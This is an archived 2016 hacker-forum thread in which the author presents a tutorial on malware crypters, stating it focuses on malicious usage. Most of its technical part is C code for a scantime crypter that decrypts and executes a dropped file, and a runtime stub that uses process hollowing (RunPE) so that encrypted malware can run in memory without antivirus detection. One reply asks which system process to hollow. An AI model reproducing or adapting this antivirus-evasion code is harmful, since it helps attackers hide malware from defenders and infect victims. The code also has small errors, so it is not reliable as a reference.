<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Crypters - Instruments of the Underground - Cryptology - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Welcome, to a guide on crypters and their technology. I‚Äôve always thought and felt that crypters were a form of mysterious dark art in this hacking world, some sort of black magic, something that‚Äôs quite obscure in terms&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="386.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Crypters - Instruments of the Underground&#39;" href="386.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/crypters-instruments-of-the-underground/386" />
<meta name="twitter:url" content="https://0x00sec.org/t/crypters-instruments-of-the-underground/386" />
<meta property="og:title" content="Crypters - Instruments of the Underground" />
<meta name="twitter:title" content="Crypters - Instruments of the Underground" />
<meta property="og:description" content="Welcome, to a guide on crypters and their technology. I‚Äôve always thought and felt that crypters were a form of mysterious dark art in this hacking world, some sort of black magic, something that‚Äôs quite obscure in terms of being able to find information and do research. Of course, it has become very common in the hacking world, especially with the release of Veil-Evasion and Shellter in 2013 and 2014 respectively. In this write-up, I will be detailing the types of crypters and how they work on ..." />
<meta name="twitter:description" content="Welcome, to a guide on crypters and their technology. I‚Äôve always thought and felt that crypters were a form of mysterious dark art in this hacking world, some sort of black magic, something that‚Äôs quite obscure in terms of being able to find information and do research. Of course, it has become very common in the hacking world, especially with the release of Veil-Evasion and Shellter in 2013 and 2014 respectively. In this write-up, I will be detailing the types of crypters and how they work on ..." />
<meta property="og:article:section" content="Cryptology" />
<meta property="og:article:section:color" content="9EB83B" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="6 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="22 ‚ù§" />
<meta property="article:published_time" content="2016-05-18T04:21:52+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="386.html">Crypters - Instruments of the Underground</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/cryptology/57.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #9EB83B"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Cryptology</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Crypters - Instruments of the Underground">
<meta itemprop="articleSection" content="Cryptology">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-18T04:21:52Z" class="post-time">
May 18, 2016, 4:21am
</time>
<meta itemprop="dateModified" content="2016-05-18T05:22:34Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Welcome, to a guide on crypters and their technology. I‚Äôve always thought and felt that crypters were a form of mysterious dark art in this hacking world, some sort of <a href="http://catb.org/jargon/html/D/deep-magic.html">black magic</a>, something that‚Äôs quite obscure in terms of being able to find information and do research. Of course, it has become very common in the hacking world, especially with the release of <a href="https://www.veil-framework.com/">Veil-Evasion</a> and <a href="https://www.shellterproject.com/">Shellter</a> in 2013 and 2014 respectively. In this write-up, I will be detailing the types of crypters and how they work on both the high level and then unraveling the lesser known magic on the lower code level. After reading this document, I hope you will all finally obtain some level of understanding on how these contraptions work and their position and roles in the computing world.</p>
<p><strong>A slight disclaimer</strong>: Some of the material may not be suitable for beginners as they require a fair amount of knowledge with Windows internals.</p>
<pre><code class="lang-sql">Proficiency in C/C++
Knowledge of the WinAPI and its documentation
Knowledge of basic cryptology
Knowledge of the PE file structure
Knowledge of Windows (virtual) memory
Knowledge of Process and Threads.
</code></pre>
<hr>
<h2>Two Sides of Cryptography</h2>
<p>When we describe <em>cryptography</em>, it usually includes something along the lines of ‚Äú<em>a means to obscure to prevent unwanted access to information</em>‚Äù. Most of us see it as such, as a defensive mechanism with applications from securing secrets to perhaps even stopping malicious intent. Of course, we would expect this as it was invented for the sole purpose of denying any prying eyes from data however, as we will soon see, cryptography has evolved into something much more than that.</p>
<p>If we look beyond the conventional use of cryptography to protect <em>against</em> malicious intent, we can see the potential for protection <em>with</em> malicious intent, that is, designing malware which harnesses the advantages with which cryptography provides. These types of malware are already very prominent in the modern age, some popular examples include ransomware and asymmetric backdoors which mainly deal with <strong>public-key cryptography</strong>. For more information on this, please see <a href="https://scholar.google.com.au/scholar?q=Cryptovirology">Cryptovirology</a>.</p>
<hr>
<p>#<span class="hashtag">#Antivirus</span> Mechanisms<br>
To be able to design a protective measure against antivirus software, we must first identify the details what we are trying to defeat. I will briefly go over the two main methods which antivirus software employ to detect unwanted applications.<br>
##<span class="hashtag">#Signature-based</span> Detection<br>
As the name implies, signature-based detection is a technique which cross-references and matches <strong>signatures</strong> of applications with a corresponding database of known malware. This is an effective measure at preventing and containing previous malware. Think of it like a vaccine for machines.<br>
##<span class="hashtag">#Heuristic-based</span> Detection<br>
Although signature-based detection can prevent <em>most</em> previously known malware, it has its disadvantages as malware authors can apply a layer of protection against this approach such as polymorphic and/or metamorphic code. The heuristic-based detection attempts to monitor the behavior and characteristics of an application and reference it with known malicious behavior. Note that this can only occur if the application is running.</p>
<p>Of course, antivirus software is much, much more advanced than this. Since it is beyond my scope of this paper and my understanding I will not be covering that information.</p>
<hr>
<p>#<span class="hashtag">#An</span> Introduction to Crypters<br>
For those who do not know what crypters are, they are software designed to protect the information within a file (usually some sort of executable format) and, on execution, be able to provide said information intact after extracting it with a decryption routine. Please note that while crypters <em>can</em> be used with malicious intent, it is also popular with obfuscating data in an effort to prevent reverse engineering. In this paper, we will focus on malicious usage. So how does this work? Let‚Äôs begin by identifying the aspects of crypters and seeing a graphical representation of their role.</p>
<p>The <strong>crypter</strong> is responsible for encrypting a target object.</p>
<pre><code class="lang-php">+-------------+      +-----------+      +-------------------+     +--------+
|  Your file  |  -&gt;  |  Crypter  |  =&gt;  |  Encrypted file   |  +  |  Stub  |
+-------------+      +-----------+      +-------------------+     +--------+
</code></pre>
<p>The <strong>stub</strong> is the sector of the encrypted object which provides the extraction and, sometimes, the execution of said object.</p>
<pre><code class="lang-php">+------------------+     +--------+                  +---------------+
|  Encrypted file  |  +  |  Stub  |  = Execution =&gt;  | Original File | 
+------------------+     +--------+                  +---------------+
</code></pre>
<h3>Scantime Crypters</h3>
<p>These types of crypters are known as <strong>scantime</strong> due to their capability of obscuring data on disk which is where antivirus software can run a scan on the file with signature-based detection, for example. In this stage, the antivirus software will never be able to detect any malicious activity provided that the applied obfuscation is robust.</p>
<h3>Runtime Crypters</h3>
<p>These crypters take it to the next level to deobfuscate the data on run in memory as it is required. By doing so, the antivirus will allow it to be loaded and executed <em>before</em> it is able to react to any malicious activity. In this stage, it is pretty much game over if an application is quick enough to administer its payload and complete its objective. It is entirely possible for the malware to trigger a heuristic-based detection from the antivirus software in the execution stage and so malware authors should be careful.</p>
<p>Now that we‚Äôve covered the high level, let‚Äôs see an example implementation of both types.</p>
<hr>
<p>#<span class="hashtag">#Coding</span> a Scantime Crypter<br>
The scantime crypter is the easier of the two since it does not require the knowledge of virtual memory and processes/threads. Essentially, the stub will deobfuscate the file, drop it onto disk somewhere and then execute it. The following documents a possible scantime crypter design.</p>
<p><strong>Note</strong>: For the sake of cleanliness and readability, I will not be including error checks.</p>
<p>##<span class="hashtag">#Crypter</span> and Stub Pseudocode</p>
<pre><code class="lang-makefile">1. Check if there is a command line argument
+-&gt; 2. If there is a command line argument, act as a crypter to crypt the file
|   3. Open the target file
|   4. Read file contents
|   5. Encrypt the file contents
|   6. Create a new file
|   7. Write the encrypted into the new file
|   8. Finish
|
+-&gt; 2. If there is no command line argument, act as the stub
    3. Open encrypted file
    4. Read file contents
    5. Decrypt the file contents
    6. Create a temporary file
    7. Write the decrypted into the temporary file
    8. Execute the file
    9. Finish
</code></pre>
<p>This design implements both the crypter and the stub in the same executable and we can do so because the two routines are pretty similar to each other. Let‚Äôs go through a possible design in code.</p>
<p>First, we will need to define main and the two conditions which define the execution as a crypter or a stub.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc &lt; 2) {
        // stub routine
    } else {
        // crypter routine
    }

    return EXIT_SUCCESS;
}
</code></pre>
<p>Since we are defining the application as a window-based application, we cannot retrieve the <code>argc</code> and <code>argv</code> as we normally would in a console-based application but Microsoft has provided a solution to that with <code>__argc</code> and <code>__argv</code>. If the command line argument <code>__argv[1]</code> exists, the application will attempt to crypt the specified file, else, it will try to decrypt an existing crypted file.</p>
<p>Moving onto the crypter routine, we‚Äôll require the handle to the specified file of <code>__argv[1]</code> and its size so we can copy its bytes into a buffer to crypt.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc &lt; 2) {
        // stub routine
    } else {
        // crypter routine
        // open file to crypt
        HANDLE hFile = CreateFile(__argv[1], FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        // get file size
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        
        // crypt and get crypted bytes
        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
    }

    return EXIT_SUCCESS;
}
</code></pre>
<p>The <code>Crypt</code> function will essentially read the file contents into a buffer and then crypt them and then return a pointer to the buffer with the encrypted bytes.</p>
<pre><code class="lang-auto">LPVOID Crypt(HANDLE hFile, DWORD dwFileSize) {
    // allocate buffer for file contents
    LPVOID lpFileBytes = malloc(dwFileSize);
    // read the file into the buffer
    ReadFile(hFile, lpFileBytes, dwFileSize, NULL, NULL);

    // apply XOR encryption
    int i;
    for (i = 0; i &lt; dwFileSize; i++) {
        *((LPBYTE)lpFileBytes + i) ^= Key[i % sizeof(Key)];
    }

    return lpFileBytes;
}
</code></pre>
<p>Now that we have the encrypted bytes, we will need to create a new file and then write these bytes into it.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc &lt; 2) {
        // stub routine
    } else {
        // crypter routine
        
        ...

        // get crypted file name in current directory
        CHAR szCryptedFileName[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, szCryptedFileName);
        strcat(szCryptedFileName, "\\");
        strcat(szCryptedFileName, CRYPTED_FILE);
        // open handle to new crypted file
        HANDLE hCryptedFile = CreateFile(szCryptedFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        // write to crypted file
        WriteFile(hCryptedFile, lpFileBytes, dwFileSize, NULL, NULL);
        CloseHandle(hCryptedFile);
        free(lpFileBytes);
    }

    return EXIT_SUCCESS;
}
</code></pre>
<p>And that‚Äôs pretty much it for the crypter section. Note that we‚Äôve used a simple XOR to encrypt the contents of the file which <em>might</em> not be enough if we have a small key. If we wanted to be more on the safe side, we can use other encryption schemes such as RC4 or (x)TEA. We do not require full-fledged unbroken cryptoalgorithms since the purpose is to avoid signature-based detection and would hence be complete overkill. Keep it small and simple.</p>
<p>Let‚Äôs continue onto the stub routine. For the stub, we want to retrieve the encrypted file in its current directory and then write the decrypted contents into a temporary file for execution.</p>
<p>We‚Äôll begin by getting the current director, then opening the file and getting the file size.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc &lt; 2) {
        // stub routine
        // get target encrypted file
        CHAR szEncryptedFileName[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, szEncryptedFileName);
        strcat(szEncryptedFileName, "\\");
        strcat(szEncryptedFileName, CRYPTED_FILE);

        // get handle to file
        HANDLE hFile = CreateFile(szEncryptedFileName, FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        // get file size
        DWORD dwFileSize = GetFileSize(hFile, NULL);
    } else {
        // crypter routine
    }

    return EXIT_SUCCESS;
}
</code></pre>
<p>Pretty much the same as the crypter routine. Next, we will read the file contents and get the decrypted bytes. Since the XOR operation restores values given a common bit, we can simply reuse the <code>Crypt</code> function. After that, we will need to create a temporary file and write the decrypted bytes into it.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc &lt; 2) {
        // stub routine
        
        ...

        // decrypt and obtain decrypted bytes
        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
        CloseHandle(hFile);

        // get file in temporary directory
        CHAR szTempFileName[MAX_PATH];
        GetTempPath(MAX_PATH, szTempFileName);
        strcat(szTempFileName, DECRYPTED_FILE);

        // open handle to temp file
        HANDLE hTempFile = CreateFile(szTempFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        // write to temporary file
        WriteFile(hTempFile, lpFileBytes, dwFileSize, NULL, NULL);
        // clean up
        CloseHandle(hTempFile);
        free(lpFileBytes);
    } else {
        // crypter routine
    }

    return EXIT_SUCCESS;
}
</code></pre>
<p>Finally, we‚Äôll need to execute the decrypted application.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (__argc &lt; 2) {
        // stub routine
        
        ...

        // execute file
        ShellExecute(NULL, NULL, szTempFileName, NULL, NULL, 0);
    } else {
        // crypter routine
    }

    return EXIT_SUCCESS;
}
</code></pre>
<p>Do note that once the decrypted application has been written to disk, it will be completely exposed to antivirus software‚Äôs signature-based detection and is likely to catch most malware. Because of this, malware authors require something which will allow the execution of their application(s) without this flaw.</p>
<p>This concludes the scantime crypter.</p>
<hr>
<h2>Coding a Runtime Crypter</h2>
<p>For the runtime crypter, I will only cover the stub since that includes the more complex material so we will assume the application has already been encrypted. A popular technique which these crypters use is called <em>RunPE</em> or <em>Dynamic Forking/Process Hollowing</em>. How this works is the stub will first decrypt an application‚Äôs encrypted bytes and then emulate the Windows loader by pushing them into the virtual memory space of a suspended process. Once that has been completed, the stub will resume the suspended process and finish.</p>
<p><strong>Note</strong>: For the sake of cleanliness and readability, I will not be including error checks.</p>
<p>##<span class="hashtag">#Stub</span> Pseudocode</p>
<pre><code class="lang-makefile">1. Decrypt application
2. Create suspended process
3. Preserve process's thread context
4. Hollow out process's virtual memory space
5. Allocate virtual memory
6. Write application's header and sections into allocated memory
7. Set modified thread context
8. Resume process
9. Finish
</code></pre>
<p>As we can see, this requires quite a bit of knowledge of Windows internals, including the PE file structure, Windows memory manipulation and processes/threads. I would highly recommend the reader to cover these fundamentals to understand the following material.</p>
<p>Firstly, let‚Äôs set up two routines in main, one for decrypting the encrypted application and the other to load it into memory for execution.</p>
<pre><code class="lang-auto">int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    Decrypt();
    RunPE();

    return EXIT_SUCCESS;
}
</code></pre>
<p>The <code>Decrypt</code> function will be entirely dependent on the encryption scheme used to encrypt the application but here is an example code using XOR.</p>
<pre><code class="lang-auto">VOID Decrypt(VOID) {
    int i;
    for (i = 0; i &lt; sizeof(Shellcode); i++) {
        Shellcode[i] ^= Key[i % sizeof(Key)];
    }
}
</code></pre>
<p>Now that the application has been decrypted, let‚Äôs take a look at where the magic happens.<br>
Here, we will verify that the application is a valid PE file by checking the DOS and PE signatures.</p>
<pre><code class="lang-auto">VOID RunPE(VOID) {
    // check valid DOS signature
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)Shellcode;
    if (pidh-&gt;e_magic != IMAGE_DOS_SIGNATURE) return;

    // check valid PE signature
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)Shellcode + pidh-&gt;e_lfanew);
    if (pinh-&gt;Signature != IMAGE_NT_SIGNATURE) return;
}
</code></pre>
<p>Now, we will create the suspended process.</p>
<pre><code class="lang-auto">VOID RunPE(VOID) {
    ...

    // get own full file name
    CHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    // initialize startup and process information
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&amp;si, sizeof(si));
    ZeroMemory(&amp;pi, sizeof(pi));
    // required to set size of si.cb before use
    si.cb = sizeof(si);
    // create suspended process
    CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);

}
</code></pre>
<p>Note that <code>szFileName</code> can be a full path to any executable file such as <code>explorer.exe</code> or <code>iexplore.exe</code> but for this example, we will be using the stub‚Äôs file. The <code>CreateProcess</code> function will create a child process of the specified file in a suspended state so that we can modify its virtual memory contents to our needs. Once that has been achieved, we should obtain its thread context before changing anything.</p>
<pre><code class="lang-auto">VOID RunPE(VOID) {
    ...

    // obtain thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.Thread, &amp;ctx);

}
</code></pre>
<p>And now will hollow out an area of the process‚Äôs virtual memory so we can allocate our own space for the application. For this, we require a function which is not readily available to us so we will require a function pointer to point to a dynamically retrieved function from the <code>ntdll.dll</code> DLL.</p>
<pre><code class="lang-auto">typedef NTSTATUS (*fZwUnmapViewOfSection)(HANDLE, PVOID);

VOID RunPE(VOID) {
    ...

    // dynamically retrieve ZwUnmapViewOfSection function from ntdll.dll
    fZwUnmapViewOfSection pZwUnmapViewOfSection = (fZwUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    // hollow process at virtual memory address 'pinh-&gt;OptionalHeader.ImageBase'
    pZwUnMapViewOfSection(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase);

    // allocate virtual memory at address 'pinh-&gt;OptionalHeader.ImageBase' of size `pinh-&gt;OptionalHeader.SizeofImage` with RWX permissions
    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

}
</code></pre>
<p>Since the suspended process has its own content inside its virtual memory space, we are required to unmap it from memory and then allocate our own so that we have the correct access and permissions to load our application‚Äôs image. We will do this with the <code>WriteProcessMemory</code> function. First, we need to write the headers and then each section individually as the Windows loader would. This section requires a thorough understanding of the PE file structure.</p>
<pre><code class="lang-auto">VOID RunPE(VOID) {
    ...

    // write header
    WriteProcessMemory(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase, Shellcode, pinh-&gt;OptionalHeader.SizeOfHeaders, NULL);

    // write each section
    int i;
    for (i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
        // calculate and get ith section
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)Shellcode + pidh-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
        // write section data
        WriteProcessMemory(pi.hProcess, (LPVOID)(lpBaseAddress + pish-&gt;VirtualAddress), (LPVOID)((DWORD)Shellcode + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData, NULL);
    }

}
</code></pre>
<p>Now that everything is in place, we will simply modify the context‚Äôs address of entry point and then resume the suspended thread.</p>
<pre><code class="lang-auto">VOID RunPE(VOID) {
    ...
 
    // set appropriate address of entry point
    ctx.Eax = pinh-&gt;OptionalHeader.ImageBase + pinh-&gt;OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &amp;ctx);
 
    // resume and execute our application
    ResumeThread(pi.hThread);
}
</code></pre>
<p>Now, the application is running within memory and hopefully, antivirus software will not detect it as it unleashes itself.</p>
<hr>
<p>#<span class="hashtag">#Conclusion</span><br>
Hopefully, at least the high level and some low level concepts have been communicated well enough for the reader to understand. If some things are still completely incomprehensible, I would highly encourage self-research on the listed topics at the beginning of this paper. If some small things are a bit unclear, do not hesitate to ask. This was not targeted at a beginner-level audience.</p>
<p>Thank you for reading.</p>
<p><em>‚Äì dtm</em></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="20" />
<span class="post-likes">20 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../c-a-simple-runtime-crypter/519.html">[C#] A Simple Runtime Crypter</a>
<meta itemprop="position" content="5">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../binary-armory-wiki/25679.html">Binary Armory Wiki</a>
<meta itemprop="position" content="6">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-18T05:06:18Z" class="post-time">
May 18, 2016, 5:06am
</time>
<meta itemprop="dateModified" content="2016-05-18T05:06:18Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Wow! Really good article DTM! I think I‚Äôll need to re-read this a few times to fully understand it <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Cal0X"><span itemprop="name">Cal0X</span></a>
(Cal0X)
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-18T11:23:21Z" class="post-time">
May 18, 2016, 11:23am
</time>
<meta itemprop="dateModified" content="2016-05-18T11:23:21Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Wonderful! Which process do you normally hollow? I myself use svchost.exe or explorer.exe.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-18T11:29:55Z" class="post-time">
May 18, 2016, 11:29am
</time>
<meta itemprop="dateModified" content="2016-05-18T11:29:55Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
